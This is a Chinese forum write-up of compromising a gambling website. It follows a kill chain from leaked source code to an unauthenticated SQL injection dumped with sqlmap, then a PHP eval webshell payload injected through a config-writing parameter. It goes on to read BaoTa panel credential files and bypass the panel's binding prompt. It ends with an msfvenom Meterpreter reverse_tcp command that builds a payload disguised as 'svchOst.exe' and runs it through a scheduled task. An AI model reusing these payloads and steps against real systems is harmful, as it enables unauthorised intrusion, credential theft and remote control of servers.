一次BC站点的GetShell过程
=================

0x0 前言
------

 [bc实战代码审计拿下后台、数据库](https://forum.butian.net/share/334)续这篇文章作者并没有成功GetShell，依稀记得以前遇到一个类似的站点，故打算再续前缘，最终成功拿下目标Shell权限。

0x1 获取源码
--------

首先先常规扫一波目录:

```bash
dirsearch -u 'http://x.x.x.x:80/' -e php
```

并没有发现有源码压缩包，故放弃这个思路，重新审视文章，获取关键字，去github进行搜索，成功找到部分源码，然后开始进行审计。

![image-20220131164522170](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e111d5bb0004407f4860aba0ba8ab8f06313758a.png)

Github:

![image-20220131165336273](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d01cdd3502b6c60b72e62b0a35d7476ccefea449.png)

0x2 进入后台
--------

通过之前的扫描，可以获取到后台登陆地址。

![image-20220131171554751](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-edd5dde8763e689250d77f7c882686ae0ee40e32.png)

访问可以看到登陆页面。

![image-20220131171633143](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-48686ca01bf0c0ecbead6709a450b4d617c4790a.png)

没有验证么，果断上一波常规的弱口令FUZZ，无果。 那么只能通过源码进行突破了, 首先观察网站的后台鉴权逻辑主要是通过包含`common/login_check.php`进行判断。

![image-20220131175602885](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-0fc69126d1532c4ceaaef6c682f09ae5f06df2c7.png)

```php
<?php
@session_start(); //后台登陆验证

if(!isset($_SESSION["adminid"])){
    unset($_SESSION["adminid"]);
    unset($_SESSION["login_pwd"]);
    unset($_SESSION["quanxian"]);
    echo "<script>alert('login!!pass');</script>";
    exit;
}else{
    include_once("../../include/mysqlio.php");
```

那么最直接的思路，就是找到一个没有包含这个文件的地方。

```bash
find ./ -name "*.php" |xargs grep -L "login_check.php"
```

找到文件`Get_Odds_1.php`, 发现其中的`$type`参数直接拼接进SQL语句中，存在注入。

![image-20220131185004448](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9423e4c6e9aa3076dab3ec3a9a68ca919b54b096.png)

正常情况:

![image-20220131185434138](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-1a22a9896d1160e5dc5ea729258f3ab4732508ac.png)

输入单引号,出错:

![image-20220131185647231](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-55d371a87932818b69bbbd7e6d84f6f1b53c2788.png)

SQLMAP 跑出账号密码,，这里虽然是GET类型的SQL注入，但是直接使用sqlmap的`-u`参数是不行的，需要使用Burp抓包，保存数据包然后用`-r`参数。

```bash
 sqlmap -r sql.txt -D dsncly -T sys_admin --dump
```

![image-20220131201813374](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-6e9b85bd45a5c905ad83dc903b2e0fa9659e3ab6.png)

0x3 GetShell
------------

进入后台，先尝试黑盒，看看有没有上传功能，不过似乎没有找到可用的上传点。

![image-20220131205127329](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e4a8892a94b47168bff8e1f661269a03f4da2549.png)

黑盒没找到很明显的办法了，只能进行快速代码审计了，直接全局搜索危险函数`eval,file_put_contens、fwrite、fputs`等。

![image-20220131210715856](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-51e1453380f659d90e6e6d0bea716c13088732dc.png)

可以看到这里写入的文件是php文件，且内容可以通过`ta_msg`参数进行控制，也没有过滤，只有简单的去除两边的空格，这里务必要自己本地进行构造下，避免出现闭合失败的错误。

构造payload:`');eval($_POST[a]);var_dump(md5(1));//;`

最终写入到文件`gp_db.php`

![image-20220131212605228](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-044809fb8a1d5a41a22162d10f2a1666418e5862.png)

成功GetShell

![image-20220131212731259](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-42a040359c0af165e7802685fcc26d728897f61c.png)

0x4 宝塔提权
--------

通过phpinfo，可以看到disable\_function，同时通过nmap扫描端口，可知目标存在宝塔。

不过幸运的是，shell的权限还是蛮高的，可以浏览到宝塔的目录。

![image-20220131213137442](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e126b9b0a629a2dd565efa48e0a1b8285a8224cd.png)

获取宝塔密码:

```bash
D:/BtSoft1/panel/data/default.pl
```

开放端口:

```bash
D:/BtSoft1/panel/data/port.pl
```

后台地址:

```bash
D:/BtSoft1/panel/data/admin_path.pl
```

获取账号：

```bash
D:/BtSoft1/panel/data/default.db
```

通过上面步骤获取到的账号和密码，登陆到后台`http://xxxx:8888/Tajl2eP0/`

![image-20220131213615395](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-089b51c2f463f36877f766262aaa8a5bab1186ca.png)

登陆进去之后会弹出强制绑定窗口，可以通过直接访问`/site`来绕过这个。

下面有两种思路进行提权:

1\) 通过软件管理-&gt;已安装，删除禁用函数，来实现命令执行。

![image-20220131213826163](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9b7eb68366f78f0e919dbf2ee91a5554bb87cb13.png)

![image-20220131213846786](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-bbaac81f5b54d4650280f8c29004a13ee60a7a9f.png)

2\) 通过宝塔自带的计划任务。

MSF生成木马

```bash
msfvenom -p windows/meterpreter/reverse_tcp  -e x86/shikata_ga_nai -i 5  LHOST=x.x.x.x LPORT=10001 EXTENSIONS=stdapi,priv  -f exe > svchOst.exe
```

放到C盘即可，然后添加shell计划任务

![image-20220131215006218](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c7110977d0cda377fafe43f49cdd3efc7707a592.png)

`ipconfig /all` 查看网络状态

![image-20220131215543485](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-b400b3ed7bf5382413dd4544d1f2b43420614d03.png)

简单查看下`arp -a`和扫描下内网网段的存活情况，并没有连通，故没有继续后续的内网渗透测试。

0x5 总结
------

 本文的渗透过程比较常规，涵盖了从0到1的完整单目标渗透过程，核心在于快速的代码审计能力，由于这个系统开发比较凌乱，所以故不能采用框架的方式去阅读，故采用危险函数定位是一种有效的方法，最后通过利用宝塔的信息，成功获取到最高的权限，完成渗透测试的目标。